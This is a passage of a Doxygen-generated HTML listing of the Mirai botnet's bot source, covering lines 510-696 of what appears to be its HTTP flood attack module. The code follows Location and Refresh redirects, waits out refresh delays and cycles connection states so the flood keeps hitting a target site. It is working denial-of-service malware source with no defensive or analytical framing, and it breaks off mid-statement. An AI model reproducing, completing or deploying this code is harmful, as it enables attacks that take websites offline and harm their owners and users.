name="l00510"></a><span class="lineno">  510</span>&#160;                        <span class="keywordtype">int</span> nl_off = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + offset, ret - offset, <span class="stringliteral">&quot;\r\n&quot;</span>, 2);</div><div class="line"><a name="l00511"></a><span class="lineno">  511</span>&#160;                        <span class="keywordflow">if</span> (nl_off != -1)</div><div class="line"><a name="l00512"></a><span class="lineno">  512</span>&#160;                        {</div><div class="line"><a name="l00513"></a><span class="lineno">  513</span>&#160;                            <span class="keywordtype">char</span> *loc_ptr = &amp;(generic_memes[offset]);</div><div class="line"><a name="l00514"></a><span class="lineno">  514</span>&#160;</div><div class="line"><a name="l00515"></a><span class="lineno">  515</span>&#160;                            <span class="keywordflow">if</span> (nl_off &gt;= 2)</div><div class="line"><a name="l00516"></a><span class="lineno">  516</span>&#160;                                nl_off -= 2;</div><div class="line"><a name="l00517"></a><span class="lineno">  517</span>&#160;                            generic_memes[offset + nl_off] = 0;</div><div class="line"><a name="l00518"></a><span class="lineno">  518</span>&#160;</div><div class="line"><a name="l00519"></a><span class="lineno">  519</span>&#160;                            <span class="comment">//increment it one so that it is length of the string excluding null char instead of 0-based offset</span></div><div class="line"><a name="l00520"></a><span class="lineno">  520</span>&#160;                            nl_off++;</div><div class="line"><a name="l00521"></a><span class="lineno">  521</span>&#160;</div><div class="line"><a name="l00522"></a><span class="lineno">  522</span>&#160;                            <span class="keywordflow">if</span> (<a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(loc_ptr, nl_off, <span class="stringliteral">&quot;http&quot;</span>, 4) == 4)</div><div class="line"><a name="l00523"></a><span class="lineno">  523</span>&#160;                            {</div><div class="line"><a name="l00524"></a><span class="lineno">  524</span>&#160;                                <span class="comment">//this is an absolute url, domain name change maybe?</span></div><div class="line"><a name="l00525"></a><span class="lineno">  525</span>&#160;                                ii = 7;</div><div class="line"><a name="l00526"></a><span class="lineno">  526</span>&#160;                                <span class="comment">//http(s)</span></div><div class="line"><a name="l00527"></a><span class="lineno">  527</span>&#160;                                <span class="keywordflow">if</span> (loc_ptr[4] == <span class="charliteral">&#39;s&#39;</span>)</div><div class="line"><a name="l00528"></a><span class="lineno">  528</span>&#160;                                    ii++;</div><div class="line"><a name="l00529"></a><span class="lineno">  529</span>&#160;</div><div class="line"><a name="l00530"></a><span class="lineno">  530</span>&#160;                                memmove(loc_ptr, loc_ptr + ii, nl_off - ii);</div><div class="line"><a name="l00531"></a><span class="lineno">  531</span>&#160;                                ii = 0;</div><div class="line"><a name="l00532"></a><span class="lineno">  532</span>&#160;                                <span class="keywordflow">while</span> (loc_ptr[ii] != 0)</div><div class="line"><a name="l00533"></a><span class="lineno">  533</span>&#160;                                {</div><div class="line"><a name="l00534"></a><span class="lineno">  534</span>&#160;                                    <span class="keywordflow">if</span> (loc_ptr[ii] == <span class="charliteral">&#39;/&#39;</span>)</div><div class="line"><a name="l00535"></a><span class="lineno">  535</span>&#160;                                    {</div><div class="line"><a name="l00536"></a><span class="lineno">  536</span>&#160;                                        loc_ptr[ii] = 0;</div><div class="line"><a name="l00537"></a><span class="lineno">  537</span>&#160;                                        <span class="keywordflow">break</span>;</div><div class="line"><a name="l00538"></a><span class="lineno">  538</span>&#160;                                    }</div><div class="line"><a name="l00539"></a><span class="lineno">  539</span>&#160;                                    ii++;</div><div class="line"><a name="l00540"></a><span class="lineno">  540</span>&#160;                                }</div><div class="line"><a name="l00541"></a><span class="lineno">  541</span>&#160;</div><div class="line"><a name="l00542"></a><span class="lineno">  542</span>&#160;                                <span class="comment">// domain: loc_ptr;</span></div><div class="line"><a name="l00543"></a><span class="lineno">  543</span>&#160;                                <span class="comment">// path: &amp;(loc_ptr[ii + 1]);</span></div><div class="line"><a name="l00544"></a><span class="lineno">  544</span>&#160;</div><div class="line"><a name="l00545"></a><span class="lineno">  545</span>&#160;                                <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(loc_ptr) &gt; 0 &amp;&amp; <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(loc_ptr) &lt; <a class="code" href="attack_8h.html#af13bc0acf7afcddfcc5098dbe5c343aa">HTTP_DOMAIN_MAX</a>)</div><div class="line"><a name="l00546"></a><span class="lineno">  546</span>&#160;                                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a706d58c70ae03423d8b1af95c2aaf8ca">domain</a>, loc_ptr);</div><div class="line"><a name="l00547"></a><span class="lineno">  547</span>&#160;</div><div class="line"><a name="l00548"></a><span class="lineno">  548</span>&#160;                                <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &lt; <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a>)</div><div class="line"><a name="l00549"></a><span class="lineno">  549</span>&#160;                                {</div><div class="line"><a name="l00550"></a><span class="lineno">  550</span>&#160;                                    <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a> - 1);</div><div class="line"><a name="l00551"></a><span class="lineno">  551</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &gt; 0)</div><div class="line"><a name="l00552"></a><span class="lineno">  552</span>&#160;                                        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, &amp;(loc_ptr[ii + 1]));</div><div class="line"><a name="l00553"></a><span class="lineno">  553</span>&#160;                                }</div><div class="line"><a name="l00554"></a><span class="lineno">  554</span>&#160;                            }</div><div class="line"><a name="l00555"></a><span class="lineno">  555</span>&#160;                            <span class="keywordflow">else</span> <span class="keywordflow">if</span> (loc_ptr[0] == <span class="charliteral">&#39;/&#39;</span>)</div><div class="line"><a name="l00556"></a><span class="lineno">  556</span>&#160;                            {</div><div class="line"><a name="l00557"></a><span class="lineno">  557</span>&#160;                                <span class="comment">//handle relative url</span></div><div class="line"><a name="l00558"></a><span class="lineno">  558</span>&#160;                                <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a> - 1);</div><div class="line"><a name="l00559"></a><span class="lineno">  559</span>&#160;                                <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &gt; 0 &amp;&amp; <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &lt; <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a>)</div><div class="line"><a name="l00560"></a><span class="lineno">  560</span>&#160;                                    <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, &amp;(loc_ptr[ii + 1]));</div><div class="line"><a name="l00561"></a><span class="lineno">  561</span>&#160;                            }</div><div class="line"><a name="l00562"></a><span class="lineno">  562</span>&#160;</div><div class="line"><a name="l00563"></a><span class="lineno">  563</span>&#160;                            conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a>;</div><div class="line"><a name="l00564"></a><span class="lineno">  564</span>&#160;                            <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00565"></a><span class="lineno">  565</span>&#160;                        }</div><div class="line"><a name="l00566"></a><span class="lineno">  566</span>&#160;                    }</div><div class="line"><a name="l00567"></a><span class="lineno">  567</span>&#160;</div><div class="line"><a name="l00568"></a><span class="lineno">  568</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a56932ae77dd79f16be9f28341dfd438f">TABLE_ATK_REFRESH_HDR</a>, NULL)) != -1)</div><div class="line"><a name="l00569"></a><span class="lineno">  569</span>&#160;                    {</div><div class="line"><a name="l00570"></a><span class="lineno">  570</span>&#160;                        <span class="keywordtype">int</span> offset = <a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(generic_memes, ret, <a class="code" href="table_8c.html#a960bec3b47b287c42b06c26eb370ed67">table_retrieve_val</a>(<a class="code" href="table_8h.html#a56932ae77dd79f16be9f28341dfd438f">TABLE_ATK_REFRESH_HDR</a>, NULL));</div><div class="line"><a name="l00571"></a><span class="lineno">  571</span>&#160;                        <span class="keywordflow">if</span> (generic_memes[offset] == <span class="charliteral">&#39; &#39;</span>)</div><div class="line"><a name="l00572"></a><span class="lineno">  572</span>&#160;                            offset++;</div><div class="line"><a name="l00573"></a><span class="lineno">  573</span>&#160;</div><div class="line"><a name="l00574"></a><span class="lineno">  574</span>&#160;                        <span class="keywordtype">int</span> nl_off = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes + offset, ret - offset, <span class="stringliteral">&quot;\r\n&quot;</span>, 2);</div><div class="line"><a name="l00575"></a><span class="lineno">  575</span>&#160;                        <span class="keywordflow">if</span> (nl_off != -1)</div><div class="line"><a name="l00576"></a><span class="lineno">  576</span>&#160;                        {</div><div class="line"><a name="l00577"></a><span class="lineno">  577</span>&#160;                            <span class="keywordtype">char</span> *loc_ptr = &amp;(generic_memes[offset]);</div><div class="line"><a name="l00578"></a><span class="lineno">  578</span>&#160;</div><div class="line"><a name="l00579"></a><span class="lineno">  579</span>&#160;                            <span class="keywordflow">if</span> (nl_off &gt;= 2)</div><div class="line"><a name="l00580"></a><span class="lineno">  580</span>&#160;                                nl_off -= 2;</div><div class="line"><a name="l00581"></a><span class="lineno">  581</span>&#160;                            generic_memes[offset + nl_off] = 0;</div><div class="line"><a name="l00582"></a><span class="lineno">  582</span>&#160;</div><div class="line"><a name="l00583"></a><span class="lineno">  583</span>&#160;                            <span class="comment">//increment it one so that it is length of the string excluding null char instead of 0-based offset</span></div><div class="line"><a name="l00584"></a><span class="lineno">  584</span>&#160;                            nl_off++;</div><div class="line"><a name="l00585"></a><span class="lineno">  585</span>&#160;</div><div class="line"><a name="l00586"></a><span class="lineno">  586</span>&#160;                            ii = 0;</div><div class="line"><a name="l00587"></a><span class="lineno">  587</span>&#160;</div><div class="line"><a name="l00588"></a><span class="lineno">  588</span>&#160;                            <span class="keywordflow">while</span> (loc_ptr[ii] != 0 &amp;&amp; loc_ptr[ii] &gt;= <span class="charliteral">&#39;0&#39;</span> &amp;&amp; loc_ptr[ii] &lt;= <span class="charliteral">&#39;9&#39;</span>)</div><div class="line"><a name="l00589"></a><span class="lineno">  589</span>&#160;                                ii++;</div><div class="line"><a name="l00590"></a><span class="lineno">  590</span>&#160;</div><div class="line"><a name="l00591"></a><span class="lineno">  591</span>&#160;                            <span class="keywordflow">if</span> (loc_ptr[ii] != 0)</div><div class="line"><a name="l00592"></a><span class="lineno">  592</span>&#160;                            {</div><div class="line"><a name="l00593"></a><span class="lineno">  593</span>&#160;                                <span class="keywordtype">int</span> wait_time = 0;</div><div class="line"><a name="l00594"></a><span class="lineno">  594</span>&#160;                                loc_ptr[ii] = 0;</div><div class="line"><a name="l00595"></a><span class="lineno">  595</span>&#160;                                ii++;</div><div class="line"><a name="l00596"></a><span class="lineno">  596</span>&#160;</div><div class="line"><a name="l00597"></a><span class="lineno">  597</span>&#160;                                <span class="keywordflow">if</span> (loc_ptr[ii] == <span class="charliteral">&#39; &#39;</span>)</div><div class="line"><a name="l00598"></a><span class="lineno">  598</span>&#160;                                    ii++;</div><div class="line"><a name="l00599"></a><span class="lineno">  599</span>&#160;</div><div class="line"><a name="l00600"></a><span class="lineno">  600</span>&#160;                                <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(&amp;(loc_ptr[ii]), <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii])), <span class="stringliteral">&quot;url=&quot;</span>) != -1)</div><div class="line"><a name="l00601"></a><span class="lineno">  601</span>&#160;                                    ii += <a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(&amp;(loc_ptr[ii]), <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii])), <span class="stringliteral">&quot;url=&quot;</span>);</div><div class="line"><a name="l00602"></a><span class="lineno">  602</span>&#160;</div><div class="line"><a name="l00603"></a><span class="lineno">  603</span>&#160;                                <span class="keywordflow">if</span> (loc_ptr[ii] == <span class="charliteral">&#39;&quot;&#39;</span>)</div><div class="line"><a name="l00604"></a><span class="lineno">  604</span>&#160;                                {</div><div class="line"><a name="l00605"></a><span class="lineno">  605</span>&#160;                                    ii++;</div><div class="line"><a name="l00606"></a><span class="lineno">  606</span>&#160;</div><div class="line"><a name="l00607"></a><span class="lineno">  607</span>&#160;                                    <span class="comment">//yes its ugly, but i dont care</span></div><div class="line"><a name="l00608"></a><span class="lineno">  608</span>&#160;                                    <span class="keywordflow">if</span> ((&amp;(loc_ptr[ii]))[<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii])) - 1] == <span class="charliteral">&#39;&quot;&#39;</span>)</div><div class="line"><a name="l00609"></a><span class="lineno">  609</span>&#160;                                        (&amp;(loc_ptr[ii]))[<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii])) - 1] = 0;</div><div class="line"><a name="l00610"></a><span class="lineno">  610</span>&#160;                                }</div><div class="line"><a name="l00611"></a><span class="lineno">  611</span>&#160;</div><div class="line"><a name="l00612"></a><span class="lineno">  612</span>&#160;                                wait_time = <a class="code" href="mirai_2bot_2util_8c.html#a45cd12b38d32ad249e74803c96a12cd3">util_atoi</a>(loc_ptr, 10);</div><div class="line"><a name="l00613"></a><span class="lineno">  613</span>&#160;</div><div class="line"><a name="l00614"></a><span class="lineno">  614</span>&#160;                                <span class="comment">//YOLO LOL</span></div><div class="line"><a name="l00615"></a><span class="lineno">  615</span>&#160;                                <span class="keywordflow">while</span> (wait_time &gt; 0 &amp;&amp; wait_time &lt; 10 &amp;&amp; fake_time + wait_time &gt; time(NULL))</div><div class="line"><a name="l00616"></a><span class="lineno">  616</span>&#160;                                    sleep(1);</div><div class="line"><a name="l00617"></a><span class="lineno">  617</span>&#160;</div><div class="line"><a name="l00618"></a><span class="lineno">  618</span>&#160;                                loc_ptr = &amp;(loc_ptr[ii]);</div><div class="line"><a name="l00619"></a><span class="lineno">  619</span>&#160;</div><div class="line"><a name="l00620"></a><span class="lineno">  620</span>&#160;</div><div class="line"><a name="l00621"></a><span class="lineno">  621</span>&#160;                                <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#aa244b92b644b15174da5ed933c90f16b">util_stristr</a>(loc_ptr, <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(loc_ptr), <span class="stringliteral">&quot;http&quot;</span>) == 4)</div><div class="line"><a name="l00622"></a><span class="lineno">  622</span>&#160;                                {</div><div class="line"><a name="l00623"></a><span class="lineno">  623</span>&#160;                                    <span class="comment">//this is an absolute url, domain name change maybe?</span></div><div class="line"><a name="l00624"></a><span class="lineno">  624</span>&#160;                                    ii = 7;</div><div class="line"><a name="l00625"></a><span class="lineno">  625</span>&#160;                                    <span class="comment">//http(s)</span></div><div class="line"><a name="l00626"></a><span class="lineno">  626</span>&#160;                                    <span class="keywordflow">if</span> (loc_ptr[4] == <span class="charliteral">&#39;s&#39;</span>)</div><div class="line"><a name="l00627"></a><span class="lineno">  627</span>&#160;                                        ii++;</div><div class="line"><a name="l00628"></a><span class="lineno">  628</span>&#160;</div><div class="line"><a name="l00629"></a><span class="lineno">  629</span>&#160;                                    memmove(loc_ptr, loc_ptr + ii, nl_off - ii);</div><div class="line"><a name="l00630"></a><span class="lineno">  630</span>&#160;                                    ii = 0;</div><div class="line"><a name="l00631"></a><span class="lineno">  631</span>&#160;                                    <span class="keywordflow">while</span> (loc_ptr[ii] != 0)</div><div class="line"><a name="l00632"></a><span class="lineno">  632</span>&#160;                                    {</div><div class="line"><a name="l00633"></a><span class="lineno">  633</span>&#160;                                        <span class="keywordflow">if</span> (loc_ptr[ii] == <span class="charliteral">&#39;/&#39;</span>)</div><div class="line"><a name="l00634"></a><span class="lineno">  634</span>&#160;                                        {</div><div class="line"><a name="l00635"></a><span class="lineno">  635</span>&#160;                                            loc_ptr[ii] = 0;</div><div class="line"><a name="l00636"></a><span class="lineno">  636</span>&#160;                                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00637"></a><span class="lineno">  637</span>&#160;                                        }</div><div class="line"><a name="l00638"></a><span class="lineno">  638</span>&#160;                                        ii++;</div><div class="line"><a name="l00639"></a><span class="lineno">  639</span>&#160;                                    }</div><div class="line"><a name="l00640"></a><span class="lineno">  640</span>&#160;</div><div class="line"><a name="l00641"></a><span class="lineno">  641</span>&#160;                                    <span class="comment">// domain: loc_ptr;</span></div><div class="line"><a name="l00642"></a><span class="lineno">  642</span>&#160;                                    <span class="comment">// path: &amp;(loc_ptr[ii + 1]);</span></div><div class="line"><a name="l00643"></a><span class="lineno">  643</span>&#160;</div><div class="line"><a name="l00644"></a><span class="lineno">  644</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(loc_ptr) &gt; 0 &amp;&amp; <a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(loc_ptr) &lt; <a class="code" href="attack_8h.html#af13bc0acf7afcddfcc5098dbe5c343aa">HTTP_DOMAIN_MAX</a>)</div><div class="line"><a name="l00645"></a><span class="lineno">  645</span>&#160;                                        <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a706d58c70ae03423d8b1af95c2aaf8ca">domain</a>, loc_ptr);</div><div class="line"><a name="l00646"></a><span class="lineno">  646</span>&#160;</div><div class="line"><a name="l00647"></a><span class="lineno">  647</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &lt; <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a>)</div><div class="line"><a name="l00648"></a><span class="lineno">  648</span>&#160;                                    {</div><div class="line"><a name="l00649"></a><span class="lineno">  649</span>&#160;                                        <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a> - 1);</div><div class="line"><a name="l00650"></a><span class="lineno">  650</span>&#160;                                        <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &gt; 0)</div><div class="line"><a name="l00651"></a><span class="lineno">  651</span>&#160;                                            <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, &amp;(loc_ptr[ii + 1]));</div><div class="line"><a name="l00652"></a><span class="lineno">  652</span>&#160;                                    }</div><div class="line"><a name="l00653"></a><span class="lineno">  653</span>&#160;                                }</div><div class="line"><a name="l00654"></a><span class="lineno">  654</span>&#160;                                <span class="keywordflow">else</span> <span class="keywordflow">if</span> (loc_ptr[0] == <span class="charliteral">&#39;/&#39;</span>)</div><div class="line"><a name="l00655"></a><span class="lineno">  655</span>&#160;                                {</div><div class="line"><a name="l00656"></a><span class="lineno">  656</span>&#160;                                    <span class="comment">//handle relative url</span></div><div class="line"><a name="l00657"></a><span class="lineno">  657</span>&#160;                                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &lt; <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a>)</div><div class="line"><a name="l00658"></a><span class="lineno">  658</span>&#160;                                    {</div><div class="line"><a name="l00659"></a><span class="lineno">  659</span>&#160;                                        <a class="code" href="mirai_2bot_2util_8c.html#af2f61b2c3c38da3f06a301c596b5b47d">util_zero</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, <a class="code" href="attack_8h.html#a0b7ec3c5170952fe1071a9326cd51264">HTTP_PATH_MAX</a> - 1);</div><div class="line"><a name="l00660"></a><span class="lineno">  660</span>&#160;                                        <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a181a242a15f441fe3eefe68330b0c8e3">util_strlen</a>(&amp;(loc_ptr[ii + 1])) &gt; 0)</div><div class="line"><a name="l00661"></a><span class="lineno">  661</span>&#160;                                            <a class="code" href="mirai_2bot_2util_8c.html#a705b6b933bc7bf0bdcb9b47833a78947">util_strcpy</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a302b8de41c5e40a19ddd91fc95e71d7a">path</a> + 1, &amp;(loc_ptr[ii + 1]));</div><div class="line"><a name="l00662"></a><span class="lineno">  662</span>&#160;                                    }</div><div class="line"><a name="l00663"></a><span class="lineno">  663</span>&#160;                                }</div><div class="line"><a name="l00664"></a><span class="lineno">  664</span>&#160;</div><div class="line"><a name="l00665"></a><span class="lineno">  665</span>&#160;                                strcpy(conn-&gt;<a class="code" href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">method</a>, <span class="stringliteral">&quot;GET&quot;</span>);</div><div class="line"><a name="l00666"></a><span class="lineno">  666</span>&#160;                                <span class="comment">// queue the state up for the next time</span></div><div class="line"><a name="l00667"></a><span class="lineno">  667</span>&#160;                                conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a91cd4ed6175b666edf34c1a23bbbe368">HTTP_CONN_QUEUE_RESTART</a>;</div><div class="line"><a name="l00668"></a><span class="lineno">  668</span>&#160;                                <span class="keywordflow">continue</span>;</div><div class="line"><a name="l00669"></a><span class="lineno">  669</span>&#160;                            }</div><div class="line"><a name="l00670"></a><span class="lineno">  670</span>&#160;                        }</div><div class="line"><a name="l00671"></a><span class="lineno">  671</span>&#160;                    }</div><div class="line"><a name="l00672"></a><span class="lineno">  672</span>&#160;</div><div class="line"><a name="l00673"></a><span class="lineno">  673</span>&#160;                    <span class="comment">// actually pull the content from the buffer that we processed via MSG_PEEK</span></div><div class="line"><a name="l00674"></a><span class="lineno">  674</span>&#160;                    processed = <a class="code" href="loader_2src_2headers_2util_8h.html#ae46c9b71f57c253f2ba79ce6bd168c4d">util_memsearch</a>(generic_memes, ret, <span class="stringliteral">&quot;\r\n\r\n&quot;</span>, 4);</div><div class="line"><a name="l00675"></a><span class="lineno">  675</span>&#160;</div><div class="line"><a name="l00676"></a><span class="lineno">  676</span>&#160;                    <span class="keywordflow">if</span> (<a class="code" href="mirai_2bot_2util_8c.html#a4ac4793080569db24ebca3104041425b">util_strcmp</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">method</a>, <span class="stringliteral">&quot;POST&quot;</span>) || <a class="code" href="mirai_2bot_2util_8c.html#a4ac4793080569db24ebca3104041425b">util_strcmp</a>(conn-&gt;<a class="code" href="structattack__http__state.html#a8e432d9597a1eafb950e8d2e82f677c1">method</a>, <span class="stringliteral">&quot;GET&quot;</span>))</div><div class="line"><a name="l00677"></a><span class="lineno">  677</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a9fe6114dced0ca47726f7afd1b3890f1">HTTP_CONN_RECV_BODY</a>;</div><div class="line"><a name="l00678"></a><span class="lineno">  678</span>&#160;                    <span class="keywordflow">else</span> <span class="keywordflow">if</span> (ret &gt; processed)</div><div class="line"><a name="l00679"></a><span class="lineno">  679</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#a91cd4ed6175b666edf34c1a23bbbe368">HTTP_CONN_QUEUE_RESTART</a>;</div><div class="line"><a name="l00680"></a><span class="lineno">  680</span>&#160;                    <span class="keywordflow">else</span></div><div class="line"><a name="l00681"></a><span class="lineno">  681</span>&#160;                        conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> = <a class="code" href="attack_8h.html#acb5cf7d3ab57770048fc89abd9f386e8">HTTP_CONN_RESTART</a>;</div><div class="line"><a name="l00682"></a><span class="lineno">  682</span>&#160;</div><div class="line"><a name="l00683"></a><span class="lineno">  683</span>&#160;                    ret = recv(conn-&gt;<a class="code" href="structattack__http__state.html#ae425bd8d4b3c18ca24d472028e024db4">fd</a>, generic_memes, processed, MSG_NOSIGNAL);</div><div class="line"><a name="l00684"></a><span class="lineno">  684</span>&#160;                } <span class="keywordflow">else</span> <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> == <a class="code" href="attack_8h.html#a9fe6114dced0ca47726f7afd1b3890f1">HTTP_CONN_RECV_BODY</a>) {</div><div class="line"><a name="l00685"></a><span class="lineno">  685</span>&#160;                    <span class="keywordflow">while</span> (<a class="code" href="loader_2src_2headers_2includes_8h.html#aa8cecfc5c5c054d2875c03e77b7be15d">TRUE</a>)</div><div class="line"><a name="l00686"></a><span class="lineno">  686</span>&#160;                    {</div><div class="line"><a name="l00687"></a><span class="lineno">  687</span>&#160;                        <span class="comment">// spooky doods changed state</span></div><div class="line"><a name="l00688"></a><span class="lineno">  688</span>&#160;                        <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a69965dc0e1f22c39e1240a8440ab89e4">state</a> != <a class="code" href="attack_8h.html#a9fe6114dced0ca47726f7afd1b3890f1">HTTP_CONN_RECV_BODY</a>)</div><div class="line"><a name="l00689"></a><span class="lineno">  689</span>&#160;                        {</div><div class="line"><a name="l00690"></a><span class="lineno">  690</span>&#160;                            <span class="keywordflow">break</span>;</div><div class="line"><a name="l00691"></a><span class="lineno">  691</span>&#160;                        }</div><div class="line"><a name="l00692"></a><span class="lineno">  692</span>&#160;</div><div class="line"><a name="l00693"></a><span class="lineno">  693</span>&#160;                        <span class="keywordflow">if</span> (conn-&gt;<a class="code" href="structattack__http__state.html#a27591f11db921ba3e368790defda050d">rdbuf_pos</a> == <a class="code" href="attack_8h.html#ac6eda2a3273daf4a93162bb51f969093">HTTP_RDBUF_SIZE</a>)</div><div class="line"><a name="l00694"></a><span class="lineno">  694</span>&#160;                        {</div><div class="line"><a name="l00695"></a><span class="lineno">  695</span>&#160;                            memmove(conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a>, conn-&gt;<a class="code" href="structattack__http__state.html#af51f958664cbeb8bf8d6e29ec166e557">rdbuf</a> + <a class="code" href="attack_8h.html#a8491fa980eede52fb92fb6dd2a46a913">HTTP_HACK_DRAIN</a>, <a class="code" href="attack_8h.html#ac6eda2a3273daf4a93162bb51f969093">HTTP_RDBUF_SIZE</a> - <a class="code" href="attack_8h.html#a8491fa980eede52fb92fb6dd2a46a913">HTTP_HACK_DRAIN</a>);</div><div class="line"><a name="l00696"></a><span class="lineno">  696</span>&#160;                            